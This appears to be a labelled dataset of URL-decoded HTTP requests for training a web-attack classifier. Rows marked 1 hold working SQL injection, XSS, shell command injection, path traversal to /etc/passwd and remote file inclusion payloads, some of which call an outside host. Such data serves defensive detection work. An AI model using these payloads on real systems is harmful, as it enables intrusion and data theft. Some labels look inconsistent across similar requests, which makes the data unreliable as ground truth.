request	label
/ examples / jsp / sessions / save . php ? file_save =  / etc / passwd 	1
/ javascript / report . core 	0
/ machinist / 	0
/ mzazmzgx / 	0
/ string / strings / parameters = dosenbac 	0
/ 000044869 / 	0
/ examples / servlets / servlet / sql . php3 ? lib_inc = 1 & btndrop = no & goto =  / etc / passwd 	1
/ protecdadosricardobarretto / 	0
/ theme / test3 . php ? root = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ? 	0
/ 0764578014 / 	0
/ string / id = 1 & nombre = jamn + ibrico '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & precio = 85 & cantidad = 73 & b1 = aadir + al + carrito 	1
/ 1164777846116 / 	0
/ string / strings / parameters = '  if ( 1 !  = 1 , 1 , sleep ( 5 )  )  --  + 	1
/ string / strings / parameters = | dir 	1
/ javascript / labs . htm 	0
/ string / strings / parameters = |   [  5 -ne  $  ( echo gjjxkm  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / modo = insertar & precio = 1304 & b1 = pasar + por + caja 	0
"/ string / strings / parameters = abc < div style =  "" x :  \ xe2 \ x80 \ x87expression ( javascript : alert ( 1 )  ""  > def "	1
"/ d7ktpmcq . fts ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 505334-001_univwashmedicalcasestudy / 	0
"/ azcrfs8d . htm ?  < script > document . cookie =  "" testjpdr = 9205 ;  ""  <  / script > "	1
/ wx4z4gedhl0l . php3 	0
/ string / strings / parameters = 5642 	0
/ javascript / dmsdump . swf 	0
/ javascript / viewcvs 	0
/ javascript / statement . msg 	0
/ string / strings / parameters = ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 ) 	1
/ string / strings / parameters = -3667 %  '  )  )  union all select 3560 , 3560 , 3560 -- 	1
/ javascript / iissamples . php3 	0
/ string / strings / parameters = calle virgen de la estrella ,  196 	0
/ string / strings / parameters = 1796108365949620 	0
/ javascript / wsdl . stackdump 	0
/ javascript / cgi-pub . exe 	1
/ string / modo = registro & login = april , 1 & password = festero & nombre = cassandra & apellidos = bakero & email = suleiman_bergstrom @ magichobby . np & dni = 78556514z & direccion = calle + seguirillas + 127 ,  + 12 ? d & ciudad = vadillo + de + la + sierra & cp = 20740 & provincia = palencia & ntc = 9716883753847934 & b1 = registrar 	1
/ 060906d / 	0
/ examples / jsp / checkbox / crystalimagehandler . aspx ? dynamicimage =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / winnt / system . ini 	1
/ manager / tinybrowser / upload . php ? badfiles = 1 >  < script > alert (  ' tinybrowser_multiple_xss . nasl '  )  <  / script > 	1
"/ o1zj4u9v . fts ?  < meta http-equiv = set-cookie content =  "" testabrn = 6368 ""  > "	1
/ easysite-2 . 0_path / configuration / browser . php ? easysite_base = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ?  ? 	0
/ string / id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 85 & b1 = aadir + al + carrito 	0
/ motorola-e6 / 	0
/ string / modo = registro & login = johan & password = recelosa & nombre = guillermina & apellidos = giulivo + padilla & email = cardona @ interanuncios . mv & dni = 93860343b & direccion = altos + de + lillo ,  + 137 +  & ciudad = lumbrales & cp = 27002 & provincia = cuenca & ntc = 5936907680257741 & b1 = registrar 	0
/ gumpdb / 	0
/ string / strings / parameters = cerveruela 	0
/ string / modo = registro & login = dorice & password = mostazal & nombre = oziel & apellidos = aro & email = falconi @ socimi . com . dd & dni = 85804612f & direccion = ronda + outeiro + s / n ,  + 6d & ciudad = val + do + dubra & cp = 24717 & provincia = guadalajara & ntc = 5963975561813500 & b1 = registrar 	0
/ string / strings / parameters = 1 )  )  as hgtl where 3864 = 3864 and elt ( 3114 = 3114 , sleep ( 5 )  )  # 	1
/  .  . 0x2f .  . 0x2f { file } 	1
/ dvdrip / 	0
"/ help . php ? q =  ""  & ver \ x09 > q33725356 & rem \ x09 "	1
/ string / strings / parameters = fonsagrada ,  a 	0
/ string / modo = registro & login = jakeman & password = c0a428o & nombre = carolina & apellidos = pepiol + acho & email = juergens-shear @ imarbella . dm & dni = aa89470ap & direccion = vicent + andreu + estelles ,  + 106 + 1 ? e & ciudad = mata + de + los + olmos ,  + la & cp = 20217 & provincia = girona & ntc = 5088681295774264 & b1 = registrar 	1
/ string / strings / parameters = masvidal canino 	0
/ kcipolletti / 	0
/ cacti / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ 160625 / 	0
/ string / strings / parameters = villanueva gualano 	0
/ newsnow_trans / 	0
/ javascript / root . temp 	0
/ string / strings / parameters = 19665853w 	0
/ 20020906-3 / 	0
/ bridge-tunnel / 	0
/ string / modo = entrar & login =  * gerr + it & pwd = pedo & remember = off & b1 = entrar 	1
/ string / strings / parameters = < a onmouseover = alert ( document . cookie )  > xxs link <  / a > 	1
"/ string / strings / parameters = < meta content =  ""  & newline ;  1  & newline ;  ;  javascript & colon ;  alert ( 1 )  ""  http-equiv =  "" refresh ""  /  > "	1
/ javascript / signed . err 	0
/ ghoulz10 / 	0
/ modules / settings / headerfile . php ? system [ path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- "	1
/ empire hotel hong kong / 	0
/ string / strings / parameters = paton 	0
/ insiderthreats / 	0
/ cookingbooks / 	0
/ 30881498 / 	0
/ drug_abuse / 	0
/ scripts / htsearch ? -c / nonexistent 	1
"/ string / strings / parameters = ""  . print (  ` echo mggibh \ necho  $  (  ( 69 + 4 )  )  \ necho mggibh \ necho mggibh `  )  ;  )  } mggibh "	1
/ string / modo = entrar & login = heleen & pwd = genia ' lmente & remember = on & b1 = entrar 	1
/ planet-6 / 	0
"/ aj3pf49c . kspx ?  < meta http-equiv = set-cookie content =  "" testnofv = 4170 ""  > "	1
/ main . php ? stuff =  ' uname  > q94914736  # 	1
/ land of mist sherlock holmes / 	0
/ examples / jsp / error / store . php ? crn = 42 '  & action = show & show_products_mode = cat_click 	1
/ 000096670 / 	0
/ 467362 / 	0
/ javascript / hour . nsf 	0
/ ai_nssecurelock / 	0
/ 20061211helix / 	0
/ newspage102 / 	0
/ m2fpztty . html ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = |  | echo srpifr $  (  ( 51 + 42 )  )  $  ( echo srpifr ) srpifr "" "	1
/ string / id = 1and + 1 = 1 	1
/ corbac / 	0
/ string / modo = registro & login = checinsk & password = c2ad953u8ro & nombre = neria & apellidos = taronger & email = lopez_novis @ ocymafa .  @ et & dni = 74014005m & direccion = avenida + roque + de + gando ,  + 193 ,  + 7 ? e & ciudad = castrobol & cp = 26324 & provincia = cuenca & ntc = 5680554856223107 & b1 = registrar 	1
/ string / strings / parameters = . h0rner3r1 	0
/ javascript / bkup . bz2 	0
/ string / strings / parameters = '  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null , null )   /  * 	1
/ electricmusic_tn / 	0
/ scripts / infosrch . cgi ? cmd = getdoc & db = man & fname =  |  / bin / id 	1
/ mechanical_turk / 	0
"/ main . php ? stuff =  "" ping -w 9000 -n 1 1 . 2 . 3 . 4 | rem "	1
/ bestprices / 	0
/ mazda6 / 	0
/ string / strings / parameters = < script for = window event = onfocus > alert ( 1 )  <  / script > 	1
/ javascript / banner . test 	0
/ ref030605 / 	0
/ string / strings / parameters = librilla 	0
/ agoraguide / 	0
"/ rpxyx07v . htm ?  < script > document . cookie =  "" testbnli = 1975 ;  ""  <  / script > "	1
/ string / str =  $  ( echo doimvy )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
"/ string / strings / parameters = -9566 %  ""  ""  )  union all select 7973 , 7973 , 7973 , 7973 -- "	1
/ pub_list / 	0
/ eim_platform / 	0
/ 0921133054-15 / 	0
"/ rpxyx07v . nsf ?  < meta http-equiv = set-cookie content =  "" testbnli = 1975 ""  > "	1
/ guidelineoo / 	0
/ string / strings / parameters = 8151 	0
/ examples / jsp / jsp2 / el / gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ tipster / 	0
/ string / modo = insertar & precio = 9834 & b1 = pasar + por + caja 	0
/ 107450 / 	0
"/ string / strings / parameters = < div style =  ""  "" width :  expression ( document . cookie = true ;  )  ;  ""  ""  > "	1
"/ chat / register . php ? register = yes & username = overg & email =  < script > alert  (  \  "" vulnerable \  ""  )  <  / script >  & email1 =  < script > alert  (  \  "" vulnerable \  ""  )  <  / script > "	1
/ inc / nuke_include . php ? newssync_enable_phpnuke_mod = 1 & newssync_nuke_path = xxpathxx ? 	1
/ string / strings / parameters = roth 	0
/ acgvnews / header . php ? pathnews = xxpathxx 	1
/ whatisthedifferencebetweenpostsandstories / 	0
"/ n1afe1y6 . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 100962 / 	0
/ javascript / pem . exe 	1
/ feature-spaceway / 	0
/ tun_gifts / 	0
/ turner ' s picture / 	1
/ auth . cookie . inc . php ? da_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	0
/ string / strings / parameters = agero 	0
/ string / modo = registro & login = reinhard & password = ddima & nombre = heli & apellidos = ponce + vilda & email = scheff_guiffre @ interpretacion-diccionario-y-significado-de-los-s & dni = 59779905f & direccion = el + morejon ,  + s / n + 11 ? d & ciudad = arbeca & cp = 39200 & provincia = segovia & ntc = 8869503887772031 & b1 = registrar 	0
/ recordings / usrdetails . php ? sgnuptype = csaleid < script > nessus <  / script > 	1
"/ string / strings / parameters = <  / title >  < script > alert (  "" xss ""  )  ;  <  / script > "	1
/ javascript / ppt . sh 	0
/ javascript / events . php 	0
/ 147520 / 	0
/ javascript / edit . out 	0
/ 000101670 / 	0
/ 1000241 / 	0
/ smac_tool / 	0
/ topphotos_gwen / 	0
/ string / id = 2 ' or ' a =  ' a 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo rybkip )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  /  / "	1
/ en-us / h5sc3gxy . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ fa8p8lr8 . kspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = entrar & login = sile & pwd = colmada43n24 & remember = off & b1 = entrar 	0
/ string / strings / parameters = 3580665595349534 	0
/ string / modo = insertar & precio = 1007 & b1 = pasar + por + caja / 	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo zwbbrm )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | "	1
/ string / str =  $  ( echo zphyvs )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # 	1
/ string / strings / parameters = 1 '  in boolean mode )  ; select benchmark ( 5000000 , md5 ( 0x4c4d6142 )  )  # 	1
/ zelenium / 	0
/ cover40 / 	0
/ recordings / admin / addentry . php ? phpbb_root_path =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1769471856078209 	0
/ pics_me / 	0
/ mzewnje2 / 	0
/ cdshield / 	0
/ multinic / 	0
/ 050613 / 	0
/ button_wie / 	0
/ jethro tull - a little light music / 	0
/ channels_2005 / 	0
"/ ghswfouu . aspx ?  < script > document . cookie =  "" testsqmm = 5713 ;  ""  <  / script > "	1
/ aftereffectsid / 	0
/ xbox-guilty / 	0
/ aidata / 	0
/ string / strings / parameters = c /  gallarza ,  147 	0
/ javascript / txt . gif 	0
/ freeppccoupons / 	0
/ javascript / folders . log 	0
"/ string / strings / parameters = '  & echo $ ifshnqwxr $  (  ( 73 + 6 )  )  $  ( echo $ ifshnqwxr ) hnqwxr "" "	1
/ news / index . dot ? id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 . jpg 	1
/ javascript / fcgi . aspx 	0
/ string / strings / parameters = 1864402022200871 	0
/ string / str =  $  ( echo wajeou )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # 	1
/ mdkvallversionsnocdfixedexeall / 	0
/ examples / jsp / checkbox / wa . exe ? debug-show-version 	1
"/ egaet53a . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = entrar & login = mc & pwd = cerverano & remember = off /  & b1 = entrar 	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo nccvwu )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ string / strings / parameters = 1 )  )  as sxhg where 7697 = 7697 or char ( 117 )  |  | char ( 111 )  |  | char ( 105 )  |  | char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- 	1
/ string / strings / parameters = 1 '  where 2389 = 2389 and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  -- 	1
/ string / strings / parameters = gavald 	0
/ tf-tant / 	0
/ duckynemo / 	0
"/ string / strings / parameters = 1 %  ""  ""  or 8514 = benchmark ( 5000000 , md5 ( 0x544d5a4c )  )  # "	1
/ string / strings / parameters = vilamasa pacheca 	0
/ chinese_sovereign / 	0
/ string / str =  $  ( echo gqpjfy )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ string / strings / parameters = pedrosa de ro rbel 	0
/ string / strings / parameters = ga7bn 	0
/ javascript / jp . jhtml 	0
/ 2661iconheadervers2 / 	0
/ examples / jsp / cal / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ mji0njqz / 	0
/ string / modo = registro & login = sadeghi & password = r4a8e3a & nombre = lujn & apellidos = gelde + pajares & email = dante @ opticaweb . mobi & dni = 51804577k & direccion = c /  + alfonso + de + armas + ayala + s / n ,  +  & ciudad = barbalos & cp = 22200 & provincia = alicante & ntc = 2781714156257998 & b1 = registrar 	0
/ string / modo = insertar & precio = 1437 & b1 = pasar + por + caja 	0
/ string / strings / parameters = ;  str =  $  ( echo zvpmjq )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ string / strings / parameters = 1 '  in boolean mode )  ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 # 	1
/ phpmyadmin / module . php ? module = osticket & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ bin / cgimail . exe 	1
/ rp06-062 / 	0
/ javascript / clk . py 	0
/ string / strings / parameters = 1 )  where 1100 = 1100 and sleep ( 5 )  -- 	1
"/ g3w7y7u5 . exe ?  < script > document . cookie =  "" testbfpq = 3326 ;  ""  <  / script > "	1
/ string / modo = registro & login = ba ? b , bie & password = esotr2ca & nombre = fede & apellidos = romera + zuleta & email = dacgnault @ ajuntamentbarcelona2-0 . name & dni = 34382308e & direccion = c /  + cuellar + 177 +  & ciudad = albalate + de + las + nogueras & cp = 24915 & provincia = segovia & ntc = 8975566519527853 & b1 = registrar 	1
/ spring2002 / 	0
/ string / strings / parameters = ' echo $ ifsmdcmcb $  (  ( 27 + 53 )  )  $  ( echo $ ifsmdcmcb ) mdcmcb & 	1
/ msg36153 / 	0
"/ string / modo = entrar & login = salomo & pwd = cap2taz3 & remember = off ""  + and +  "" 1 ""  =  "" 1 & b1 = entrar "	1
/ 1165342998 / 	0
/ string / strings / parameters = 1 '  in boolean mode )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  -- 	1
/ string / strings / parameters = 06131 	0
"/ help . php ? q =  "" ping \ x0c-w \ x0c8000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 & rem \ x0c "	1
/ javascript / 3g . svn-base 	0
/ gallery / displaycategory . php ? basepath = xxpathxx 	1
/ string / strings / parameters = 1 where 6494 = 6494 and 8463 = 2760 	1
/ parasit tv - del 02 / 	0
/ string / strings / parameters = 38993479s 	0
/ 0x2e0x2e \  { file } 	1
/ string / strings / parameters = pankiw 	0
/ string / strings / parameters = sagrada familia 124 ,  5 ? b 	0
/ string / strings / parameters = 1 )  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  -- 	1
/ scripts / cgi-test . exe 	1
/ string / strings / parameters = 4296 	0
/ string / strings / parameters = |  | echo $ ifsecavfz $  (  ( 36 + 1 )  )  $  ( echo $ ifsecavfz ) ecavfz 	1
/ string / strings / parameters = 1 '  )  or char ( 117 )  |  | char ( 111 )  |  | char ( 105 )  |  | char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null ) 	1
/ kickstandcity / 	0
"/ string / strings / parameters = < a href =  "" rhainfosec . com ""  onmouseover = alert ( 1 )  > clickhere <  / a > "	1
/ string / modo = registro & login = jenner & password = 8374f09a2 & nombre = queila & apellidos = brun + canalis & email = temple @ fernandosoto . ch & dni = 77300409p & direccion = calle + campo + charro ,  + 89 ,  +  & ciudad = leiro & cp = 16878 & provincia = len & ntc = 6079560291532789 & b1 = registrar 	0
/ 148972 / 	0
/ javascript / restore . png 	0
/ string / modo = registro & login = shutterb & password = 4ntorchar & nombre = noam & apellidos = samper + folco & email = menant @ venderfotografias . se & dni = 33151406b & direccion = calle + aladierna ,  + 85 + 3 ? a & ciudad = burujn & cp = 28648 & provincia = barcel ? ona & ntc = 1260473774275985 & b1 = registrar 	1
/ modules / wiwimod / spaw / spaw_control . class . php ? spaw_root = xxpathxx 	1
"/ string / strings / parameters = ""  /  >  < img src = x onerror = x . onerror = prompt & lpar ;  / xss /  . source & rpar ;  ; confirm ( 0 )  ; confirm ( 1 )  > "	1
/ en-us / h5sc3gxy . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ bibliogr / 	0
/ string / strings / parameters = 1 '  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 and  ' osqf '  =  ' osqf 	1
"/ string / strings / parameters = | echo $ ifsbtkibl $  (  ( 76 + 11 )  )  $  ( echo $ ifsbtkibl ) btkibl "" "	1
/ 162560 / 	0
/ pc . shtml 	0
/ policies_publications / 	0
/ string / strings / parameters = jauyau 	0
"/ string / strings / parameters = '  |  | echo zjaxer $  (  ( 49 + 60 )  )  $  ( echo zjaxer ) zjaxer "" "	1
/ imagesc7 / 	0
/ string / strings / parameters = 1 %  '  or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- 	1
/ string / modo = registro & logina = allyce & password = 9a64nejo & nombre = mayco & apellidos = pulido + curt & email = rogel @ soyrojo . um & dni = 98584189w & direccion = rafael + salgado + 140 ,  +  & ciudad = campos + del + ro & cp = 37419 & provincia = zaragoza & ntc = 2410127429866610 & b1 = registrar 	1
/ imginfoboxtop / 	0
"/ aj3pf49c . dll ?  < script > document . cookie =  "" testnofv = 4170 ;  ""  <  / script > "	1
/ examples / jsp / colors / cal_event . php ? id = 1 '  union select 1 , 2 ,  ' calendarix_id_sql_injection . nasl '  , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 -- 	1
/ civilian_casualties / 	0
/ string / strings / parameters = 1 '  )  as zxos where 2745 = 2745 ; select pg_sleep ( 5 )  -- 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo lvvacm )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
"/ string / strings / parameters = |   [  9 -ne  $  ( echo mrdzpj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ string / strings / parameters = declare  @ q nvarchar  ( 200 )  select  @ q  =  0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec (  @ q ) 	1
/ string / strings / parameters = 1 '  )  as wtev where 5283 = 5283 ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  -- 	1
/ wayne_kramer / 	0
/ msmmask . exe ? mask =  / nessus1788090238 . asp 	1
/ 9o6g5vkn . dll ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / exec . exe 	1
"/ help . php ? q =  ""  & rm \ x09q66374774 & rem \ x09 "	1
/ string / modo = registro & login = busuttil & password = 5664no & nombre = apolinario & apellidos = ahmid + yazn & email = niro @ grancolisionadordehadrones . th & dni = 76750429bg & direccion = calle + alfred + nobel ,  + 142 + 12g & ciudad = cesuras & cp = 41500 & provincia = len & ntc = 8811866823125640 & b1 = registrar 	1
/ string / strings / parameters = calle garci-perez 41 ,  9 ? c 	0
/ cp1setup / 	0
/ javascript / elements . pdf 	0
/ index . php ? in = song & term = lambada & action = search & start =  ' error_test 	1
/ javascript / actions . exe 	1
/ symcert / 	0
/ string / strings / parameters = 69634281x 	0
"/ string / strings / parameters = ""  |   [  3 -ne  $  ( echo ypwxzb  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ "	1
/ examples / jsp / error / manager / media / browser / mcpuk / connectors / php / commands / thumbnail . php ? base_path =  / etc / passwd \ x00 	1
/ hexeditor / 	0
/ string / strings / parameters = cuesta sagrado corazon ,  155 5 ? a 	0
/ string / id = 1 & nombre = queso + manchego & precio = 85 & cantidad = 31 & b1 = aadir + al + carrito 	0
/ points / 	0
/ debug / dbg ? host =  =  < script > alert (  ' vulnerable '  )  ;  <  / script > 	1
/ 126144 / 	0
/ moonglow / 	0
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testcmax = 9270 ""  > "	1
/ string / strings / parameters = 1 %  '  )  )  ; begin dbms_lock . sleep ( 5 )  ;  end and  (  (  '  %  '  =  ' 	1
/ string / strings / parameters = ' echo olrhzx $  (  ( 22 + 72 )  )  $  ( echo olrhzx ) olrhzx /  / 	1
/ string / strings / parameters = descabal ! gadura 	0
"/ top . php ? stuff =  "" rm q69198385  # "	1
/ javascript / trunk . vb 	0
/ en-us / 7o5qp766 . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ employee_concerns / 	0
"/ help . php ? q =  "" ping -w 7000 -n 1 1 . 2 . 3 . 4 & rem "	1
/ examples / jsp / colors / admin / configset . php ? settings_dir =  / etc / passwd \ x00 	1
/ string / strings / parameters = 25g0a00 	0
/ string / strings / parameters = 59bi8ari7o 	0
/ string / strings / parameters = 1 '  +  ( select  ' iyvn '  where 9358 = 9358 or elt ( 6272 = 6272 , sleep ( 5 )  )  )  +  ' 	1
/ cgi-bin / starnet / addons / slideshow_full . php ? album_name =  ' 1485593337 	1
/ string / modo = insertar & precio = 8081 & b1 = confirmar 	0
/ cgi-bin / index . php ? src = 1 & _common = 1 & time = 1331923205 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ jpf_icon / 	0
/ string / modo = registro & login = pic & password = emba ? ulada & nombre = cruz & apellidos = puyal + catalan & email = eastside-luco @ apicultor . ms & dni = 39658514m & direccion = c /  + don + juan + de + aguilar + 168 ,  +  & ciudad = nava ,  + la & cp = 31284 & provincia = len & ntca = 6217533099373869 & b1 = registrar 	1
/ isapierr / 	0
/ string / strings / parameters = |   [  4 -ne  $  ( echo kxlyid  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ string / strings / parameters = calle mayor ,  s / n 11h 	0
/ string / strings / parameters = 1 '  )  )  or 6979 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ snippetmaster / includes / vars . inc . php ? _session [ script_path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ? 	1
/ austrian_gifts / 	0
/ javascript / downloads . save 	0
/ mjqxntu5 / 	0
/ string / modo = registro & login = renato & password = didcticamente & nombre = favio & apellidos = crcamo + m , oj + i-ca & email = frisco_tretow @ citiway . ec & dni = 79332852x & direccion = calle + los + perez + 117 ,  +  & ciudad = aguasal & cp = 15881 & provincia = badajoz & ntc = 5960331754539682 & b1 = registrar 	1
/ string / strings / parameters = 50227 	0
/ ows-bin / fileseek2 . cgi ? foot =  ; cat  / etc / passwd & head = 	1
/ javascript / page2 . php3 	0
/ string / strings / parameters = echo eifxcg $  (  ( 20 + 68 )  )  $  ( echo eifxcg ) eifxcg | 	1
/ string / id = 2 & nombre = jamn + ibrico & precio = 85 & cantidad = 37 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = 3363230401310436 	0
"/ h4bi26jd . nsf ?  < meta http-equiv = set-cookie content =  "" testhrzx = 1150 ""  > "	1
"/ en-us / accountsearch-results . dot ? search_query = nessus ""  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  / "	1
/  .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ string / strings / parameters = ince2 @ flexinspect . cat 	0
/ javascript / action . save 	0
/ string / strings / parameters = -9553 )  )  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  ( 5299 = 5299 	1
/ q41123388 	0
/ satire_cartoon / 	0
/ highway1 / 	0
/ javascript / staff . csv 	0
/ gifts_crafts / 	0
/ b000btdmdc / 	0
/ 1166198588 / 	0
/  .  .  % u2215 .  .  % u2215 { file } 	1
/ cgi-bin / bb_func_txt . php ? pathtofiles =  / etc / passwd \ x00 	1
/ string / strings / parameters = http :  /  / ywytwcjfxogobxxgvddetetagtlgyhxbvxnggoippestrcyzxwtjlhqfrctmayher . com 	0
/ 40462000 / 	0
/ string / strings / parameters = merrywea 	0
/ examples / jsp / jsp2 / misc / snoopservlet / 	0
/ opequon_gifts / 	0
/ string / strings / parameters = ruben 	0
/ efnetsux / 	0
/ string / strings / parameters = guerette 	0
